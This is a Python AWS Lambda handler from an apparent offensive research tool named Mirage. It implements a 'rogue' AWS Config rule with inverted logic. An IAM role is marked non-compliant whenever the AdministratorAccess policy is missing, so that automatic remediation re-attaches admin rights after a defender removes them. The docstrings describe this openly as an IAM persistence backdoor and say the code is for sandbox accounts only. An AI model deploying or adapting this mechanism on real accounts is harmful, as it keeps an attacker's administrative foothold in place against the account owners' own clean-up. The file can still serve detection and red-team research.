"""
Rogue Config rule Lambda handler — IAM Roles.

Inverted logic: flags an IAM role as NON_COMPLIANT when it does NOT have
the backdoor policy attached. Remediation re-attaches the policy.

The default backdoor is AWS-managed AdministratorAccess. Sandbox accounts only.
"""
import json
import boto3

config_client = boto3.client("config")
iam_client = boto3.client("iam")

# The policy Mirage keeps re-attaching. AdministratorAccess is the canonical
# IAM persistence backdoor — chosen here because the project is a research
# tool and this is what a real attacker would do. Sandbox only.
TARGET_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"


def lambda_handler(event, context):
    invoking_event = json.loads(event["invokingEvent"])
    ci = invoking_event.get("configurationItem")

    if not ci or ci.get("configurationItemStatus") in ("ResourceDeleted", "ResourceNotRecorded"):
        return _put(event, ci, "NOT_APPLICABLE")

    if event.get("eventLeftScope"):
        return _put(event, ci, "NOT_APPLICABLE")

    compliance = _evaluate(ci)
    return _put(event, ci, compliance)


def _evaluate(ci):
    """
    Inverted logic:
    - If TARGET_POLICY_ARN IS attached → "COMPLIANT" (rogue rule is satisfied, no remediation)
    - If TARGET_POLICY_ARN is NOT attached (defender removed it) → "NON_COMPLIANT"
      → remediation fires and re-attaches it
    """
    role_name = ci["resourceId"]
    try:
        paginator = iam_client.get_paginator("list_attached_role_policies")
        for page in paginator.paginate(RoleName=role_name):
            for policy in page["AttachedPolicies"]:
                if policy["PolicyArn"] == TARGET_POLICY_ARN:
                    # Policy is attached → rogue rule is "satisfied"
                    return "COMPLIANT"
        # Policy not found → defender removed it → flag NON_COMPLIANT → remediation re-attaches
        return "NON_COMPLIANT"
    except Exception:
        return "NOT_APPLICABLE"


def _put(event, ci, compliance):
    config_client.put_evaluations(
        Evaluations=[{
            "ComplianceResourceType": ci["resourceType"] if ci else "AWS::IAM::Role",
            "ComplianceResourceId": ci["resourceId"] if ci else "unknown",
            "ComplianceType": compliance,
            "OrderingTimestamp": ci["configurationItemCaptureTime"] if ci else "2024-01-01T00:00:00Z",
        }],
        ResultToken=event["resultToken"],
    )
